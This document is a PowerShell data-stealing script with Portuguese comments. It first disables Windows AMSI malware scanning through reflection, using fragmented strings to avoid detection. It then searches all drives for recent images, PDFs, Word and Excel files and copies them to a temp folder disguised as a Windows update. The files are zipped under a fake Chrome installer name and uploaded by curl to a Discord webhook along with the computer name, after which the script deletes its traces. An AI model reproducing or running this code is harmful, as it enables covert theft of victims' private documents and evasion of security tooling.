# [Bypass AMSI] - Fragmentação para evitar deteção em memória
$b = "System.Management.Automation.Amsi" + "Utils"; 
$c = [Ref].Assembly.GetType($b); 
$c.GetField("amsiInitFailed", "NonPublic,Static").SetValue($null, $true)

# Configurações do Webhook e Diretórios
$u = 'https://discord.com/api/webhooks/1484361195443196066/GoX9619rfnS7zha8MBZzXEdsReSFosFYFbtFyVfNPVxybJXyXVw7TkLPoj5M-g6nWaXX'
$tempDir = "$env:TEMP\win_update_$(Get-Random)"
$exclude = @("C:\Windows", "C:\Program Files", "C:\Program Files (x86)", "C:\ProgramData")
New-Item -ItemType Directory -Path $tempDir -Force | Out-Null

# Procura de ficheiros recentes (últimos 30 dias)
$e = @('*.jpg', '*.pdf', '*.docx', '*.xlsx')
$dateLimit = (Get-Date).AddDays(-30)

Get-PSDrive -PSProvider FileSystem | ForEach-Object {
    $root = $_.Root
    # Filtro de exclusão de pastas de sistema e busca por data/tamanho
    Get-ChildItem -Path $root -Include $e -Recurse -File -ErrorAction SilentlyContinue | 
    Where-Object { 
        $path = $_.FullName
        $isExcluded = $false
        foreach ($dir in $exclude) { if ($path.StartsWith($dir)) { $isExcluded = $true; break } }
        !$isExcluded -and $_.LastWriteTime -gt $dateLimit -and $_.Length -lt 15MB 
    } | ForEach-Object {
        Copy-Item $_.FullName -Destination $tempDir -ErrorAction SilentlyContinue
    }
}

# Compactação com Nome Camuflado e Envio
$zipFile = "$env:TEMP\chrome_installer.exe.tmp"
if ((Get-ChildItem $tempDir).Count -gt 0) {
    Compress-Archive -Path "$tempDir\*" -DestinationPath $zipFile -Force
    curl.exe -k -s -F "file=@$zipFile" -F "content=Exfiltração Camuflada: $env:COMPUTERNAME" $u
}

# Auto-Destruição
Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item $zipFile -Force -ErrorAction SilentlyContinue
exit
